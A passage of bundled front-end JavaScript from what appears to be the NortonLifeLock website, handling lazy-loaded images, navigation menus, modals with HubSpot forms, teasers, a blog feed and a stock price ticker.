      var mapElement = temporaryDocument.querySelector(selectors.map);
      if (mapElement) {
        that._elements.container.insertBefore(mapElement, that._elements.noscript);
      }
      that._elements.noscript.parentNode.removeChild(that._elements.noscript);
      if (that._elements.container.matches(selectors.image)) {
        that._elements.image = that._elements.container;
      } else {
        that._elements.image = that._elements.container.querySelector(selectors.image);
      }
      that._elements.map = that._elements.container.querySelector(selectors.map);
      that._elements.areas = that._elements.container.querySelectorAll(selectors.area);
    }
    function removeLazyLoader() {
      that._elements.image.classList.remove(lazyLoader.cssClass);
      for (var property in lazyLoader.style) {
        if (Object.prototype.hasOwnProperty.call(lazyLoader.style, property)) {
          that._elements.image.style[property] = "";
        }
      }
      that._elements.image.removeEventListener("load", removeLazyLoader);
      that._lazyLoaderShowing = false;
    }
    function isLazyVisible() {
      if (that._elements.container.offsetParent === null) {
        return false;
      }
      var wt = window.pageYOffset;
      var wb = wt + document.documentElement.clientHeight;
      var et = that._elements.container.getBoundingClientRect().top + wt;
      var eb = et + that._elements.container.clientHeight;
      return eb >= wt - that._properties.lazythreshold && et <= wb + that._properties.lazythreshold;
    }
    function resizeAreas() {
      if (that._elements.areas && that._elements.areas.length > 0) {
        for (var i = 0; i < that._elements.areas.length; i++) {
          var width = that._elements.image.width;
          var height = that._elements.image.height;
          if (width && height) {
            var relcoords = that._elements.areas[i].dataset.cmpRelcoords;
            if (relcoords) {
              var relativeCoordinates = relcoords.split(",");
              var coordinates = new Array(relativeCoordinates.length);
              for (var j = 0; j < coordinates.length; j++) {
                if (j % 2 === 0) {
                  coordinates[j] = parseInt(relativeCoordinates[j] * width);
                } else {
                  coordinates[j] = parseInt(relativeCoordinates[j] * height);
                }
              }
              that._elements.areas[i].coords = coordinates;
            }
          }
        }
      }
    }
    function cacheElements(wrapper) {
      that._elements = {};
      that._elements.self = wrapper;
      var hooks = that._elements.self.querySelectorAll("[data-" + NS + "-hook-" + IS + "]");
      for (var i = 0; i < hooks.length; i++) {
        var hook = hooks[i];
        var capitalized = IS;
        capitalized = capitalized.charAt(0).toUpperCase() + capitalized.slice(1);
        var key = hook.dataset[NS + "Hook" + capitalized];
        that._elements[key] = hook;
      }
    }
    function setupProperties(options) {
      that._properties = {};
      for (var key in properties) {
        if (Object.prototype.hasOwnProperty.call(properties, key)) {
          var property = properties[key];
          if (options && options[key] != null) {
            if (property && typeof property.transform === "function") {
              that._properties[key] = property.transform(options[key]);
            } else {
              that._properties[key] = options[key];
            }
          } else {
            that._properties[key] = properties[key]["default"];
          }
        }
      }
    }
    function onWindowResize() {
      that.update();
      resizeAreas();
    }
    function onLoad() {
      resizeAreas();
    }
    that.update = function () {
      if (that._properties.lazy) {
        if (isLazyVisible()) {
          loadImage();
        }
      } else {
        loadImage();
      }
    };
    if (config && config.element) {
      init(config);
    }
  }
  function onDocumentReady() {
    var elements = document.querySelectorAll(selectors.self);
    for (var i = 0; i < elements.length; i++) {
      new Image({
        element: elements[i],
        options: readData(elements[i])
      });
    }
    var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;
    var body = document.querySelector("body");
    var observer = new MutationObserver(function (mutations) {
      mutations.forEach(function (mutation) {
        // needed for IE
        var nodesArray = [].slice.call(mutation.addedNodes);
        if (nodesArray.length > 0) {
          nodesArray.forEach(function (addedNode) {
            if (addedNode.querySelectorAll) {
              var elementsArray = [].slice.call(addedNode.querySelectorAll(selectors.self));
              elementsArray.forEach(function (element) {
                new Image({
                  element: element,
                  options: readData(element)
                });
              });
            }
          });
        }
      });
    });
    observer.observe(body, {
      subtree: true,
      childList: true,
      characterData: true
    });
  }
  if (document.readyState !== "loading") {
    onDocumentReady();
  } else {
    document.addEventListener("DOMContentLoaded", onDocumentReady);
  }

  /*
      on drag & drop of the component into a parsys, noscript's content will be escaped multiple times by the editor which creates
      the DOM for editing; the HTML parser cannot be used here due to the multiple escaping
   */
  function decodeNoscript(text) {
    text = text.replace(/&(amp;)*lt;/g, "<");
    text = text.replace(/&(amp;)*gt;/g, ">");
    return text;
  }
})();
hookEventListeners();
!function (t) {
  var e = {};
  function o(n) {
    if (e[n]) return e[n].exports;
    var a = e[n] = {
      i: n,
      l: !1,
      exports: {}
    };
    return t[n].call(a.exports, a, a.exports, o), a.l = !0, a.exports;
  }
  o.m = t, o.c = e, o.d = function (t, e, n) {
    o.o(t, e) || Object.defineProperty(t, e, {
      enumerable: !0,
      get: n
    });
  }, o.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, o.t = function (t, e) {
    if (1 & e && (t = o(t)), 8 & e) return t;
    if (4 & e && "object" == typeof t && t && t.__esModule) return t;
    var n = Object.create(null);
    if (o.r(n), Object.defineProperty(n, "default", {
      enumerable: !0,
      value: t
    }), 2 & e && "string" != typeof t) for (var a in t) o.d(n, a, function (e) {
      return t[e];
    }.bind(null, a));
    return n;
  }, o.n = function (t) {
    var e = t && t.__esModule ? function () {
      return t.default;
    } : function () {
      return t;
    };
    return o.d(e, "a", e), e;
  }, o.o = function (t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }, o.p = "", o(o.s = 1);
}([function (t, e, o) {}, function (t, e, o) {
  "use strict";

  o.r(e);
  o(0);
  var n = function () {
    $(".c-alrt__x-container-js").on("click", function () {
      $(this).closest(".c-alrt__container").addClass("c-alrt--collapsed");
    });
  };
  var a = function () {
    $(".c-btn--disabled a").on("click", function (t) {
      t.preventDefault();
    });
  };
  var c = function () {
      $(".c-langdd__select--js option").each(function () {
        var t = $(this).attr("value");
        if (t === location.pathname) return $(".c-langdd__select--js").val(t), !1;
      });
    },
    r = function () {
      $(".c-langdd__select--js").change(function () {
        var t = $(this).val();
        "select" !== t && (location.pathname = t);
      });
    };
  const i = t => {
      try {
        const e = t.split("?")[0],
          o = e.split("#")[0].replace(/\/$/, "");
        return o.split("/").pop().split(".")[0];
      } catch (t) {
        console.log("nlokUtil: getPageString() ::" + t);
      }
    },
    l = {
      css: {
        modalFade: "c-modal__fade",
        modalOpen: "c-modal__open",
        modalTrigger: "c-modal__trigger",
        modalContainer: "c-modal__container",
        modal: "c-modal__modal",
        modalCloseBtn: "c-modal__modal-close"
      },
      dom: {
        modalTrigger: () => document.querySelectorAll("." + l.css.modalTrigger),
        modalContainer: () => document.querySelectorAll("." + l.css.modalContainer),
        modal: () => document.querySelector("." + l.css.modal),
        modalCloseBtn: () => document.querySelectorAll("." + l.css.modalCloseBtn)
      },
      closeModal: () => {
        l.dom.modalContainer().forEach(t => {
          t.classList.remove("c-modal__modal-open");
        }), document.body.classList.remove("" + l.css.modalFade), setTimeout(function () {
          document.body.classList.remove("" + l.css.modalOpen);
        }, 500);
      },
      clickTracking: (t, e) => {
        if ("undefined" != typeof s) {
          let o, n;
          nortonAnalytics && (o = nortonAnalytics.page_name, n = nortonAnalytics.site_sub_section);
          const a = "nortonlifelock-" + n + ":" + o + "_hubspot-form_" + t + e;
          s.linkTrackVars = "prop41,eVar41", s.prop41 = "nortonlifelock", s.eVar41 = "nortonlifelock", s.tl(!0, "o", a);
        }
      },
      setup: () => {
        l.dom.modalTrigger() && l.dom.modalTrigger().forEach(t => {
          t.addEventListener("click", () => {
            const e = t.getAttribute("data-modal-id"),
              o = t.getAttribute("data-component-name");
            let n = t.getAttribute("data-component-identifier");
            n = n ? "_" + n : "", l.clickTracking(o, n), document.getElementById("" + e) && (document.body.classList.add("" + l.css.modalOpen), setTimeout(function () {
              document.body.classList.add("" + l.css.modalFade), document.getElementById("" + e).classList.add("c-modal__modal-open");
            }, 10));
          });
        }), l.dom.modalCloseBtn() && l.dom.modalCloseBtn().forEach(t => {
          t.addEventListener("click", () => {
            l.closeModal();
          });
        }), l.dom.modalContainer() && l.dom.modalContainer().forEach(t => {
          t.addEventListener("click", e => {
            const o = t.querySelector(".c-modal__modal");
            o && (o.contains(e.target) || l.closeModal());
          });
        });
      },
      injectHubspotForm: () => {
        document.querySelectorAll(".c-modal__container").forEach(t => {
          if (t.classList.contains("hubspot-code")) {
            const e = null !== t.getAttribute("data-formprops") ? t.getAttribute("data-formprops") : "",
              o = t.querySelector(".hbspt-form").getAttribute("id");
            if ("" !== e) {
              const t = JSON.parse("{" + e + ',"target": "#' + o + '"}');
              hbspt.forms.create(t);
            }
          }
        });
      }
    };
  var d = {
    bindEvents: {
      onResize: function () {
        window.onresize = d.checkOverFlow;
      },
      onClick: function () {
        $(".c-snav__mobile-active-header").on("click", function () {
          var t = $(".c-snav__mobile-toggle-open");
          t.hasClass("c-snav__mobile-toggle-closed") ? t.hasClass("c-snav__mobile-toggle-closed") && (t.removeClass("c-snav__mobile-toggle-closed"), $(".c-snav-dropdown-menu").stop().slideUp(250)) : (t.addClass("c-snav__mobile-toggle-closed"), $(".c-snav-dropdown-menu").slideDown(250));
        }), $(".c-snav__list-link").on("click", function () {
          var t;
          const e = window.nortonAnalytics ? window.nortonAnalytics.page_name : "";
          this.href.includes("#") && (t = "nortonlifelock-" + e + "_" + this.href.split("#").pop()), "undefined" != typeof s && (s.linkTrackVars = "prop41,eVar41", s.prop41 = "nortonlifelock", s.eVar41 = "nortonlifelock", s.tl(!0, "o", t));
        });
      }
    },
    scrollControl: function () {
      const t = document.querySelectorAll(".c-snav__list");
      t && t.forEach(function (t) {
        t.scrollWidth > t.parentElement.offsetWidth && t.parentElement.classList.add("c-snav__desktop-toggle-show");
        const e = [],
          o = t.querySelectorAll("li");
        o.forEach(function (t) {
          e.push(t.offsetWidth);
        });
        const n = t.previousElementSibling,
          a = t.nextElementSibling;
        let s = 0;
        n.addEventListener("click", () => {
          t.scroll({
            top: 0,
            left: 0,
            behavior: "smooth"
          }), s = 0;
        });
        let c = 0;
        a.addEventListener("click", () => {
          const n = t.scrollLeft;
          o[e.length - 1].getBoundingClientRect().right <= t.parentElement.getBoundingClientRect().right ? 0 == c ? (c = 1, t.scroll({
            top: 0,
            left: n + e[s] + 30,
            behavior: "smooth"
          })) : (s = 0, t.scroll({
            top: 0,
            left: 0,
            behavior: "smooth"
          })) : (t.scroll({
            top: 0,
            left: n + e[s] + 30,
            behavior: "smooth"
          }), s++);
        });
      });
    },
    updateSecNavInid: function (t, e) {
      const o = window.nortonAnalytics ? window.nortonAnalytics.page_name : "";
      (t = document.querySelectorAll(t)).forEach(t => {
        if (t.href) try {
          const n = new URL(t.href),
            a = i(n.pathname);
          if (t.classList.contains("c-snav__cta-button") || t.classList.contains("c-snav__cta-button-two")) {
            const s = t.classList.contains("c-snav__cta-button") ? 1 : 2;
            n.searchParams.set("inid", `nortonlifelock-${o}_${e}-cta${s}_${a}`);
          } else n.searchParams.set("inid", `nortonlifelock-${o}_${e}_${a}`);
          t.href = decodeURIComponent(n.toString());
        } catch (t) {
          console.log(e + " :: invalid href for CTA", t);
        }
      });
    },
    init: function () {
      $(".c-snav-dropdown-menu").stop().slideUp(1), this.scrollControl(), this.bindEvents.onResize(), this.bindEvents.onClick();
    }
  };
  var _ = function () {
    var t = $(".c-slid").data("desktop"),
      e = $(".c-slid").data("mobile") || 1,
      o = $(".c-slid").data("tablet") || t;
    $(".c-slid").slick({
      speed: 500,
      fade: !1,
      cssEase: "linear",
      initialSlide: 0,
      autoplay: !0,
      pauseOnFocus: !1,
      infinite: !0,
      dots: !0,
      arrows: !1,
      centerPadding: "260px",
      dotsClass: "slick-dots",
      responsive: [{
        breakpoint: 1e3,
        settings: {
          slidesToShow: o
        }
      }, {
        breakpoint: 768,
        settings: {
          slidesToShow: e
        }
      }]
    });
  };
  var u = {
    bindEvents: {
      onResize: function () {
        window.onresize = u.checkOverFlow;
      },
      onClick: function () {
        $(".c-tnav__toggle").length && $(".c-tnav__toggle").click(function () {
          u.scrollLeft();
        });
      }
    },
    scrollLeft: function () {
      var t = $(".c-tnav__list").scrollLeft();
      if (Math.abs(t - ($(".c-tnav__list")[0].scrollWidth - $(".c-tnav__list").innerWidth())) < 2) $(".c-tnav__list").animate({
        scrollLeft: "-=" + t
      }, 300);else {
        var e = $("li.c-tnav__list-item:first").width();
        $(".c-tnav__list").animate({
          scrollLeft: "+=" + e
        }, 300);
      }
    },
    checkOverFlow: function () {
      if ($(".c-tnav__list").length > 0) {
        var t = $(".c-tnav__toggle");
        $(".c-tnav__list").innerWidth() < $(".c-tnav__list")[0].scrollWidth - 25 ? t.hasClass("c-tnav__toggle--show") || t.addClass("c-tnav__toggle--show") : t.hasClass("c-tnav__toggle--show") && t.removeClass("c-tnav__toggle--show");
      }
    },
    removeActiveBorderRight: function () {
      $(".c-tnav__list-item--active").next().find("div.c-tnav__list-border").addClass("c-tnav__list-border--remove");
    }
  };
  var f = {
    css: {
      teaser: "teaser",
      defaultCta: "c-teaser__default .c-teaser__button-link",
      threeUpNoCta: "c-teaser__no-cta .c-teaser__button-link",
      threeUpSecondary: "c-teaser__secondary .c-teaser__button-link",
      threeUpPortfolio: "c-teaser__portfolio .c-teaser__button-link",
      threeUpPortfolioNoCta: "c-teaser__portfolio_wo_link .c-teaser__button-link",
      fourUpNoCta: "c-teaser__no-cta-4-up .c-teaser__button-link",
      fourUpPortfolio: "c-teaser__portfolio-4-up .c-teaser__button-link",
      fourUpPortfolioNoCta: "c-teaser__portfolio_wo_link-4-up .c-teaser__button-link",
      fourUpSecondary: "c-teaser__portfolio-secondary-cta-4-up .c-teaser__button-link",
      teaserImage: "c-teaser__img-link",
      teaserTitle: "c-teaser__title-link",
      teaserLinkButton: "c-teaser__button c-teaser__button-link"
    },
    dom: {
      teaserContainers: () => document.querySelectorAll("." + f.css.teaser)
    },
    appendInid: function () {
      f.dom.teaserContainers().forEach((t, e) => {
        const o = t.querySelector(`.${f.css.defaultCta}, .${f.css.threeUpNoCta}, .${f.css.threeUpSecondary}, .${f.css.threeUpPortfolio}, .${f.css.threeUpPortfolioNoCta}, .${f.css.fourUpNoCta}, .${f.css.fourUpPortfolio}, .${f.css.fourUpPortfolioNoCta}, .${f.css.fourUpSecondary}`),
          n = t.querySelector("." + f.css.teaserImage),
          a = t.querySelector("." + f.css.teaserTitle),
          s = f.hasParentWithMatchingSelector(a, ".c-teaser__video-style-2-up");
        try {
          o && f.appendInidToHref(o, e), n && f.appendInidToHref(n, e), a && !s && f.appendInidToHref(a, e);
        } catch (t) {
          console.log("Teaser: appendInid() ::" + t);
        }
      });
    },
    hasParentWithMatchingSelector: function (t, e) {
      return [...document.querySelectorAll(e)].some(e => e !== t && e.contains(t));
    },
    startTeaser: function () {
      [".c-teaser__portfolio_wo_link", ".c-teaser__portfolio_wo_link-4-up"].forEach(function (t) {
        $(t).each(function () {
          $(this).find("a").attr("href") && $(this).off("click").on("click", function (t) {
            t.preventDefault();
          });
        });
      });
      [".c-teaser__no-cta", ".c-teaser__no-cta-4-up"].forEach(function (t) {
        $(t).each(function () {
          var t = $(this).find("a").first(),
            e = t.attr("href"),
            o = t.attr("target");
          e && $(this).find(".c-teaser__bottom-container").on("click", function () {
            o ? window.open(e, "_blank") : window.location.href = e;
          });
        });
      });
    },
    hoverEffects: function () {
      $(".c-teaser__secondary .c-teaser, .c-teaser__no-cta .c-teaser, .c-teaser__no-cta-4-up .c-teaser").each(function () {
        var t = $(this);
        t.on("mouseenter", function () {
          $(".c-teaser").removeClass("teaser-hover-js"), t.addClass("teaser-hover-js"), t.find(".c-teaser__button").on("mouseenter", function () {
            t.trigger("mouseleave");
          }).on("mouseleave", function () {
            t.trigger("mouseenter");
          });
        }).on("mouseleave", function () {
          t.removeClass("teaser-hover-js");
        });
      });
    },
    matchHeight: function (t) {
      var e = [];
      t.each(function () {
        var t = $(this).height();
        e.push(t);
      });
      var o = Math.max.apply(null, e);
      t.each(function () {
        $(this).height(o);
      });
    },
    matchHeightForAllSelectors: function () {
      var t = [".c-teaser__portfolio-secondary-cta-4-up .c-teaser__desc,.c-teaser__portfolio .c-teaser__title", ".c-teaser__portfolio .c-teaser__desc", ".c-teaser__portfolio_wo_link .c-teaser__title", ".c-teaser__portfolio_wo_link .c-teaser__desc", ".c-teaser__portfolio-4-up .c-teaser__title", ".c-teaser__portfolio-4-up .c-teaser__desc", ".c-teaser__portfolio_wo_link-4-up .c-teaser__title", ".c-teaser__portfolio_wo_link-4-up .c-teaser__desc"];
      function e() {
        t.forEach(function (t) {
          f.matchHeight($(t));
        });
      }
      function o() {
        t.forEach(function (t) {
          $(t).removeAttr("style");
        });
      }
      $(window).width() > 767 && e(), $(window).resize(function () {
        var t = $(window).width();
        t < 768 ? ($(".c-teaser__title").css({
          height: "auto"
        }), $(".c-teaser__desc").css({
          height: "auto"
        })) : (t > 767 && t < 1e3 || t >= 1e3) && (o(), e());
      });
    },
    appendInidToHref: (t, e) => {
      [t].forEach(t => {
        if (window.nortonAnalytics) {
          const o = window.nortonAnalytics.page_name || "";
          if ("undefined" !== t.href && "" !== t.href) {
            const n = new URL(t.href);
            let a = "";
            const s = i(n.pathname);
            a = "nortonlifelock-" + o + "_teaser-" + (e + 1) + "_" + s, n.searchParams.set("inid", a), t.href = decodeURIComponent(n.toString().toLowerCase());
          }
        }
      });
    }
  };
  var p = {
    state: {
      paused: !1
    },
    bindEvents: {
      onClick: function () {
        $(document).on("click", function (t) {
          var e,
            o,
            n,
            a = $(t.target);
          if (a.closest(".c-scrt__container").length) {
            e = (n = $(".c-scrt__controls")).attr("data-pause"), o = n.attr("data-play");
            var s = $(this).find(".c-scrt__ticker-list");
            (a.hasClass("c-scrt__pause--js") || a.hasClass("c-scrt__pause")) && (p.state.paused ? (s.css("animation-play-state", "running"), p.state.paused = !1, $(".c-scrt__arrow").removeClass("c-scrt__arrow c-scrt__arrow-prev").addClass("c-scrt__pause"), a.attr("aria-label", e)) : (s.css("animation-play-state", "paused"), p.state.paused = !0, $(".c-scrt__pause").removeClass("c-scrt__pause").addClass("c-scrt__arrow").addClass("c-scrt__arrow-prev"), a.attr("aria-label", o))), (a.hasClass("c-scrt__x-container-js") || a.hasClass("c-scrt__x-img")) && $(".c-scrt__container").addClass("c-scrt--collapsed");
          }
        });
      }
    }
  };
  var h = function () {
    var t,
      e,
      o = $(".c-title");
    o.length && o.each(function () {
      t = $(this).find("div"), (e = $(this).children().last()).addClass("c-title-lockbar"), t.filter(function () {
        return "center" == $(this).css("text-align");
      }).length && e.addClass("c-title-centered");
    });
  };
  $(document).ready(function () {
    n(), a(), c(), r(), d.init(), d.updateSecNavInid(".c-snav__list-link,.c-snav__cta-button,.c-snav__cta-button-two", "subnav"), $(".c-slid").length && _(), u.checkOverFlow(), u.bindEvents.onResize(), u.bindEvents.onClick(), u.removeActiveBorderRight(), f.appendInid(), f.startTeaser(), f.hoverEffects(), f.matchHeightForAllSelectors(), p.bindEvents.onClick(), h(), l.dom.modal() && (l.setup(), l.injectHubspotForm());
  });
}]);
window.addEventListener("load", function () {
  logGlobalVariables();
});
setInterval(logGlobalVariables, 5 * 60 * 1000);
!function (e) {
  var t = {};
  function o(n) {
    if (t[n]) return t[n].exports;
    var a = t[n] = {
      i: n,
      l: !1,
      exports: {}
    };
    return e[n].call(a.exports, a, a.exports, o), a.l = !0, a.exports;
  }
  o.m = e, o.c = t, o.d = function (e, t, n) {
    o.o(e, t) || Object.defineProperty(e, t, {
      enumerable: !0,
      get: n
    });
  }, o.r = function (e) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(e, "__esModule", {
      value: !0
    });
  }, o.t = function (e, t) {
    if (1 & t && (e = o(e)), 8 & t) return e;
    if (4 & t && "object" == typeof e && e && e.__esModule) return e;
    var n = Object.create(null);
    if (o.r(n), Object.defineProperty(n, "default", {
      enumerable: !0,
      value: e
    }), 2 & t && "string" != typeof e) for (var a in e) o.d(n, a, function (t) {
      return e[t];
    }.bind(null, a));
    return n;
  }, o.n = function (e) {
    var t = e && e.__esModule ? function () {
      return e.default;
    } : function () {
      return e;
    };
    return o.d(t, "a", t), t;
  }, o.o = function (e, t) {
    return Object.prototype.hasOwnProperty.call(e, t);
  }, o.p = "", o(o.s = 1);
}([function (e, t, o) {}, function (e, t, o) {
  "use strict";

  o.r(t);
  o(0);
  var n = {
    callAPI: function (e) {
      var t, o, a;
      o = "/bin/nortonlifelock/blogfeed", o += "?synd_api=" + encodeURIComponent(e), (a = n.isStorageAvailable()) && sessionStorage.getItem(e) ? ($(".c-blog__spinner").hide(), $(".c-blog__container").addClass("c-blog--animated c-blog--animatedFadeInUp c-blog--fadeInUp"), t = JSON.parse(sessionStorage.getItem(e)), n.buildPosts(t)) : $.getJSON(o).done(function (t) {
        $(".c-blog__spinner").hide();
        var o = [];
        t.results && (t.results.slice(0, 4).forEach(function (e) {
          var t = {};
          t.mobileImage = e.heroImage.blogs_teaser.url ? e.heroImage.blogs_teaser.url : "", t.tabletImage = e.heroImage.blogs_teaser.sources[0].srcset ? e.heroImage.blogs_teaser.sources[0].srcset : "", t.desktopImage = e.heroImage.blogs_teaser.sources[1].srcset ? e.heroImage.blogs_teaser.sources[1].srcset : "", t.postTitle = e.title ? e.title : "", t.postDescription = e.subtitle ? e.subtitle : "", t.postMeta = n.getPostedNote(e.createdDate, e.timeToRead), t.postLink = e.urlAlias ? "https://www.nortonlifelock.com/blogs" + e.urlAlias : "", o.push(t);
        }), n.buildPosts(o), $(".c-blog__container").addClass("c-blog--animated c-blog--animatedFadeInUp c-blog--fadeInUp"), a && sessionStorage.setItem(e, JSON.stringify(o)), n.equalRowHeights());
      }).fail(function (e) {
        $(".c-blog__spinner").hide(), console.log(e);
      });
    },
    buildPosts: function (e) {
      const t = document.querySelector(".c-blog__container>template").content.querySelector("div"),
        o = document.createDocumentFragment();
      e.forEach(function (e) {
        const n = document.importNode(t, !0);
        n.querySelectorAll("a").forEach(function (t) {
          t.href = e.postLink;
        });
        const a = n.querySelectorAll("picture>source");
        a[0].srcset = e.desktopImage, a[1].srcset = e.tabletImage, n.querySelector("picture>img").src = e.mobileImage, n.querySelector(".c-blog__card-text-title").textContent = e.postTitle, n.querySelector(".c-blog__card-text-description").textContent = e.postDescription, n.querySelector(".typ-p-note").textContent = "Posted: " + e.postMeta, e.mobileImage && e.tabletImage && e.desktopImage && e.postTitle && e.postLink && e.postMeta && o.appendChild(n);
      }), document.querySelector(".c-blog").appendChild(o), n.equalRowHeights();
    },
    getPostedNote: function (e, t) {
      var o = "",
        n = "";
      if (e && e.length) {
        var a = (o = new Date(e)).getDate().toString().length < 2 ? "0" + o.getDate().toString() : o.getDate().toString(),
          c = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "AUG", "NOV", "DEC"][o.getMonth()],
          s = o.getFullYear();
        o = a + " " + c + ", " + s;
      }
      return t && t.length && (n = " | " + t + " Min Read"), o + n;
    },
    isStorageAvailable: function () {
      var e;
      try {
        e = window.sessionStorage;
        var t = "__storage_test__";
        return e.setItem(t, t), e.removeItem(t), !0;
      } catch (t) {
        return _instanceof(t, DOMException) && (22 === t.code || 1014 === t.code || "QuotaExceededError" === t.name || "NS_ERROR_DOM_QUOTA_REACHED" === t.name) && e && 0 !== e.length;
      }
    },
    equalRowHeights: function () {
      var e = ".c-blog .c-blog__card-text",
        t = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
      t >= 768 && (t <= 1e3 ? n.equalize(e, 2) : n.equalize(e, 4));
    },
    equalize: function (e, t) {
      for (var o = t, n = 0, a = document.querySelectorAll(e), c = a.length, s = c % t, r = s > 0 ? 1 : 0, l = Math.floor(c / t) + r, i = 1; i <= l; i++) {
        var d = 0,
          m = [];
        i === l && r && (o = s);
        for (var u = 1; u <= o; u++) {
          var p = a[n].scrollHeight;
          if (m.push(n), p > d && (d = p), u === o) for (var _ = 0; _ < m.length; _++) {
            a[m[_]].style.height = d + "px";
          }
          n++;
        }
      }
    }
  };
  var a = {
    getTicker: function () {
      if ($(".c-nav__ticker").length || $(".c-nav__mobile-ticker-stock").length) {
        $.getJSON("https://symantecir2019cr.q4web.com/feed/StockQuote.svc/GetStockQuoteList?apiKey=39F4BA4A52EE4296AE4316445E81A552&exchange=NASDAQ&symbol=NLOK&pageSize=1").done(function (e) {
          if (e && e.GetStockQuoteListResult && e.GetStockQuoteListResult.length) {
            var t = e.GetStockQuoteListResult[0],
              o = t.TradePrice ? t.TradePrice : "",
              n = t.Change ? t.Change : "",
              a = t.PercChange ? t.PercChange : "",
              c = "",
              s = "";
            if ("number" == typeof o && "number" == typeof n && "number" == typeof a) {
              var r = "$" + Number.parseFloat(o).toFixed(2),
                l = Number.parseFloat(n).toFixed(2),
                i = Number.parseFloat(Math.abs(a)).toFixed(2) + "%";
              n < 0 && (c += "<div class='c-nav__ticker-wrapper'>", c += "<span class='c-nav__ticker-down'></span>", c += "<span class='c-nav__ticker-symbol'>NLOK</span>", c += "<span class='c-nav__ticker-price'>" + r + "</span>", c += "<span class='c-nav__ticker-change c-nav__ticker-cp-down'>" + l + "</span>", c += "<span class='c-nav__ticker-percentage c-nav__ticker-cp-down'>" + i + "</span>", c += "</div>", s += "<p class='c-nav__mobile-ticker-stock'>", s += "<span class='c-nav__mobile-ticker-down'></span>", s += "<span class='c-nav__mobile-ticker-symbol'>NLOK</span>", s += "<span class='c-nav__mobile-ticker-price'>" + r + "</span>", s += "<span class='c-nav__mobile-ticker-change c-nav__mobile-ticker-cp-down'>" + l + "</span>", s += "<span class='c-nav__mobile-ticker-percentage c-nav__mobile-ticker-cp-down'>" + i + "</span>", s += "</p>"), n >= 0 && (c += "<div class='c-nav__ticker-wrapper'>", c += "<span class='c-nav__ticker-up'></span>", c += "<span class='c-nav__ticker-symbol'>NLOK</span>", c += "<span class='c-nav__ticker-price'>" + r + "</span>", c += "<span class='c-nav__ticker-change c-nav__ticker-cp-up'>+" + l + "</span>", c += "<span class='c-nav__ticker-percentage c-nav__ticker-cp-up'>" + i + "</span>", c += "</div>", s += "<p class='c-nav__mobile-ticker-stock'>", s += "<span class='c-nav__mobile-ticker-up'></span>", s += "<span class='c-nav__mobile-ticker-symbol'>NLOK</span>", s += "<span class='c-nav__mobile-ticker-price'>" + r + "</span>", s += "<span class='c-nav__mobile-ticker-change c-nav__mobile-ticker-cp-up'>+" + l + "</span>", s += "<span class='c-nav__mobile-ticker-percentage c-nav__mobile-ticker-cp-up'>" + i + "</span>", s += "</p>");
            } else c += " <li class='c-nav__ribbon-menu-item'>NLOK</li>";
          }
          $(".c-nav__ribbon-menu-item:first-child").prepend(c), $(".c-nav__mobile-ticker").append(s);
        }).fail(function (e) {
          console.log(e);
        });
      }
    },
    bindEvents: {
      onClick: function () {
        $(".c-nav__close-hamburger-js").off("mousedown").on("mousedown", function (e) {
          a.openMobileNav(e);
        }), $(".c-nav__mobile-menu-bg-js").off("mousedown").on("mousedown", function (e) {
          a.closeMobileNav(e);
        }), $(".c-nav__ribbon-submenu-trigger-js").off("mousedown").on("mousedown", function () {
          var e = $(this).closest(".c-nav__ribbon-menu-item");
          e.toggleClass("c-nav__ribbon-submenu--active"), e.siblings().removeClass("c-nav__ribbon-submenu--active");
        }), $(".c-nav__mobile-menu-item-expand").off("mousedown").on("mousedown", function () {
          var e = $(this).closest(".c-nav__mobile-menu-item");
          e.toggleClass("c-nav__mobile-menu-item-expand--active"), e.siblings().removeClass("c-nav__mobile-menu-item-expand--active");
        });
      }
    },
    accessibility: function () {
      $("header").keydown(function (e) {
        var t = e.keyCode ? e.keyCode : e.which,
          o = $(e.target.parentElement),
          n = 9 === t && !0 !== e.shiftKey,
          c = 9 === t && !0 === e.shiftKey,
          s = 27 === t,
          r = 40 === t,
          l = 38 === t;
        if (e.target.attributes["aria-haspopup"] && "true" === e.target.attributes["aria-haspopup"].value && (r ? (e.preventDefault(), e.target.attributes["aria-expanded"] && ("false" === e.target.attributes["aria-expanded"].value ? (a.openSubNav(o), $("header").off("mousemove").on("mousemove", function () {
          a.closeSubNav(o);
        })) : "true" === e.target.attributes["aria-expanded"].value && a.closeSubNav(o))) : (s || c || l) && a.closeSubNav(o)), o.closest(".c-nav__desktop-submenu").length > 0) {
          var i = o.closest(".c-nav__desktop-menu-item-has-submenu.open"),
            d = o.is(":last-child") && n,
            m = o.is(":first-child") && c;
          d ? a.closeSubNav(i) : (s || m) && (a.closeSubNav(i), i.children("a").focus());
        } else if (o.closest(".c-nav__ribbon-submenu").length > 0) {
          i = o.closest(".c-nav__ribbon-menu-item.open"), d = o.is(":last-child") && n, m = o.is(":first-child") && c;
          d ? a.closeSubNav(i) : (s || m) && (a.closeSubNav(i), i.children("a").focus());
        }
      });
    },
    openMobileNav: function (e) {
      e.stopPropagation(), e.preventDefault(), $(".c-nav__mobile-menu-box").addClass("c-nav__mobile--open"), $(".c-nav__mobile-menu-bg-js").fadeIn("fast"), $(".c-nav__close-hamburger-js").off("mousedown").attr("aria-expanded", !0).addClass("c-nav__close-hamburger--x"), $(".c-nav__close-hamburger-js.c-nav__close-hamburger--x").off("mousedown").on("mousedown", function (e) {
        a.closeMobileNav(e);
      }), $(".l-container--page").addClass("u-no-scroll");
    },
    closeMobileNav: function (e) {
      e.stopPropagation(), e.preventDefault(), $(".c-nav__mobile-menu-box").removeClass("c-nav__mobile--open"), $(".c-nav__mobile-menu-bg-js").fadeOut("fast"), $(".c-nav__close-hamburger-js.c-nav__close-hamburger--x").off("mousedown").attr("aria-expanded", !1).removeClass("c-nav__close-hamburger--x"), $(".c-nav__close-hamburger-js").off("mousedown").on("mousedown", function (e) {
        a.openMobileNav(e);
      }), $(".l-container--page").removeClass("u-no-scroll");
    },
    hideMobileExpanderLinks: function () {
      $(".c-nav__mobile-menu-item").each(function () {
        var e = $(this);
